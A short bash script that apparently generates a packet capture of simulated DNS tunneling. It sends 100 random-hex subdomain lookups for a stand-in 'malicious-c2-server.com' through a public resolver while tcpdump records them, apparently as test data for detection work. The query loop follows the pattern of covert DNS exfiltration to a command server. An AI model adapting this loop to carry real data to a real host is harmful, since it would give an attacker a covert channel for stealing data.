#!/bin/bash
echo "Starting DNS tunneling attack capture..."
sudo tcpdump -i en0 'port 53' -w dnstunnel_attack.pcap &
TCPDUMP_PID=$!
sleep 3
echo "Simulating DNS tunneling (100 suspicious queries)..."
for i in {1..100}; do
  RANDOM_DATA=$(openssl rand -hex 16)
  nslookup ${RANDOM_DATA}.malicious-c2-server.com 8.8.8.8 > /dev/null 2>&1
  sleep 0.1
done
sleep 3
echo "Stopping capture..."
sudo kill $TCPDUMP_PID
sleep 2
echo "Done! Checking file..."
ls -lh dnstunnel_attack.pcap
tcpdump -r dnstunnel_attack.pcap | wc -l
